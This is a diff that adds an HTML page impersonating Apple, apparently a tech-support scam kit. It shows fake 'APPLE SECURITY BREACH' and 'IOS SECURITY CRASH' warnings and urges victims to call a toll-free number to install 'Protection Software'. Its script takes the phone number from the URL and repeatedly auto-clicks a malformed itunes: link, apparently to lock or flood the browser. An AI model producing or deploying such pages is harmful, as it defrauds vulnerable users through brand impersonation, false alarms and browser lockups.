@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html class="js no-touch svg no-ie no-ie9 no-oldie sticky" >
+
+<head>
+
+<meta name="format-detection" content="telephone=no">
+<style>
+#mask {
+position: absolute;
+left: 0;
+top: 0;
+z-index: 9000;
+/*background-color:#FF0000;*/
+display: none;
+}
+
+</style>
+
+<script src="js/jquery.js"></script> 
+<script>
+$(document).ready(function() { 
+
+var id = '#dialog';
+
+
+var maskHeight = $(document).height();
+var maskWidth = $(window).width();
+
+
+$('#mask').css({'width':maskWidth,'height':maskHeight});
+
+$('#mask').fadeIn(500); 
+$('#mask').fadeTo("slow",0.7); 
+$(id).css('top', winH/2-$(id).height()/2);
+$(id).css('left', winW/2-$(id).width()/2);
+
+$(id).fadeIn(2000); 
+
+$('.window .close').click(function (e) {
+
+e.preventDefault();
+
+$('#mask').hide();
+$('.window').hide();
+});
+
+$('#mask').click(function () {
+$(this).hide();
+$('.window').hide();
+}); 
+});
+
+</script>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7, IE=9">
+
+<meta charset="utf-8">
+<meta name="Author" content="Apple Inc.">
+<link rel="canonical" href="http://www.apple-it.support/">
+
+
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+<link rel="stylesheet" type="text/css" href="css/ac-globalnav.css">
+<link rel="stylesheet" type="text/css" href="css/ac-globalfooter.css">
+
+
+
+<link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
+
+<script src="css/jquery.min.js" type="text/javascript" charset="utf-8"></script>
+<script src="css/bootstrap.min.js" type="text/javascript" charset="utf-8"></script>
+
+<title itemprop="name">Apple</title>
+
+
+
+</head>
+<p id="status">.</p>
+<p id="result" style="color:red"></p>
+<div id="boxes">
+
+<div id="mask"></div>
+</div>
+<body class="page-home" style="color:#000">
+
+
+<nav id="ac-globalnav" class="js no-touch svg no-ie7 no-ie8" role="navigation">
+<div class="ac-gn-content">
+<ul class="ac-gn-header">
+<li class="ac-gn-item ac-gn-menuicon">
+<label class="ac-gn-menuicon-label" for="ac-gn-menustate" aria-hidden="true"> <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
+<span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span> </span> <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
+<span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span> </span>
+</label>
+<a data-analytics-click="prefix:t,prop3pen Menu" href="#ac-gn-menustate" class="ac-gn-menuanchor ac-gn-menuanchor-open" id="ac-gn-menuanchor-open"> <span class="ac-gn-menuanchor-label">Open Menu</span> </a>
+<a data-analytics-click="prefix:t,prop3:Close Menu" href="#" class="ac-gn-menuanchor ac-gn-menuanchor-close" id="ac-gn-menuanchor-close"> <span class="ac-gn-menuanchor-label">Close Menu</span> </a>
+</li>
+<li class="ac-gn-item ac-gn-apple">
+<a class="ac-gn-link ac-gn-link-apple" href="#" data-analytics-title="apple home" id="ac-gn-firstfocus-small"> <span class="ac-gn-link-text">Apple</span> </a>
+</li>
+<li class="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
+<a aria-controls="ac-gn-bagview-content" aria-expanded="false" aria-haspopup="true" role="button" class="ac-gn-link ac-gn-link-bag" href="#" data-analytics-title="bag" data-analytics-click="prefix:t,prop3hopping Bag" aria-label="Shopping Bag" data-string-badge="Shopping Bag with Items"> <span class="ac-gn-link-text">Shopping Bag</span> <span class="ac-gn-bag-badge"></span> </a> <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span> </li>
+</ul>
+</div>
+</nav>
+<div class="container" style="margin-top:-25px">
+<p style="text-aling:center;margin:0px;padding:0px"> <br> <b style="font-size:20px;"><center>WARNING!!<img src='warning.png'></center><center> APPLE SECURITY BREACH!!</center><center>IOS SECURITY CRASH</center></b><br><center>Transfering Your Personal Data and Pictures.<br> Call Apple Support (Toll-Free) <strong style="font-size:18px"><font class="phoneNumber">+1-844-313-7003</font></strong> </p><img src="trn.png"></center>
+<center><p style="color:grey; align:justify; margin-bottom:2%;"><font color="#000000"><br><br><strong><font color="#FF0000" class="blinking"><strong>Call <font class="phoneNumber">+1-844-313-7003</font> </strong>immediately to connect with Apple Technical Support for installing the Protection Software.</font></font></p></center>
+
+</div>
+
+
+<footer id="ac-globalfooter" class="js no-touch svg no-ie7 no-ie8" data-analytics-region="global footer" role="contentinfo" aria-labelledby="ac-gf-label" lang="en-US">
+
+<section class="ac-gf-footer" typeof="Organization">
+<div class="ac-gf-footer-shop" x-ms-format-detection="none"> More ways to shop: Visit an <a href="#">Apple Store</a>, <span class="nowrap">call <font class="phoneNumber">+1-844-313-7003</font>, or <a href="#">find a reseller</a></span>. </div>
+<div class="ac-gf-footer-locale"> <a class="ac-gf-footer-locale-link" href="#" title="Choose your country or region" aria-label="United States. Choose your country or region"><span class="ac-gf-footer-locale-flag" data-hires="false"></span>United States</a> </div>
+<div class="ac-gf-footer-legal">
+<div class="ac-gf-footer-legal-copyright">Copyright © 2015 Apple Inc. All rights reserved.</div>
+<div class="ac-gf-footer-legal-links"> <a class="ac-gf-footer-legal-link" href="#">Privacy Policy</a> <a class="ac-gf-footer-legal-link" href="#">Terms of Use</a> <a class="ac-gf-footer-legal-link" href="#">Sales and Refunds</a> <a class="ac-gf-footer-legal-link" href="#">Site Map</a> </div>
+</div>
+<meta content="Apple" property="name">
+<meta content="+1-844-313-7003" property="telephone"> </section>
+
+</div>
+</footer>
+
+
+<script type="text/javascript">
+function blinker() {
+$('.blinking').fadeOut(500);
+$('.blinking').fadeIn(500);
+}
+setInterval(blinker, 1000);
+var extraData = "";
+for (itxextraData = 0; itxextraData < 1; itxextraData++) {
+var extraData = extraData + "hello";
+}
+function getPar(name) {
+	var url = window.location.href;
+	name = name.replace(/[\[\]]/g, "\\$&");
+	var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+		results = regex.exec(url);
+	if (!results) return null;
+	if (!results[2]) return '';
+	return decodeURIComponent(results[2].replace(/\+/g, " "));
+};
+var number = getPar('phone');
+var numrepl = document.querySelectorAll('font.phoneNumber');
+for(var n=0;n<numrepl.length;n++){
+	numrepl[n].innerHTML=number;
+}
+jQuery('#result').append('<a href="itunes:' + extraData + '%00">.</a>');
+document.querySelector('a').click();
+document.querySelector('a').click();
+document.querySelector('a').click();
+document.querySelector('a').click();
+document.querySelector('a').click();
+document.querySelector('a').click();
+document.querySelector('a').click();
+document.querySelector('a').click();
+document.querySelector('a').click();
+document.querySelector('a').click();
+document.querySelector('a').click();
+document.querySelector('a').click();
+document.querySelector('a').click();
+document.querySelector('a').click();
+document.querySelector('a').click();
+document.querySelector('a').click();
+document.querySelector('a').click();
+document.querySelector('a').click();
+document.querySelector('a').click();
+document.querySelector('a').click();
+document.querySelector('a').click();
+document.querySelector('a').click();
+document.querySelector('a').click();
+document.querySelector('a').click();
+document.querySelector('a').click();
+document.querySelector('a').click();
+document.querySelector('a').click();
+document.querySelector('a').click();
+document.querySelector('a').click();
+document.querySelector('a').click();
+for(var i = 0; i<elems.length; i++) {
+elems[i].click();
+}
+
+
+</script>
+</body>
+
+</html>
+
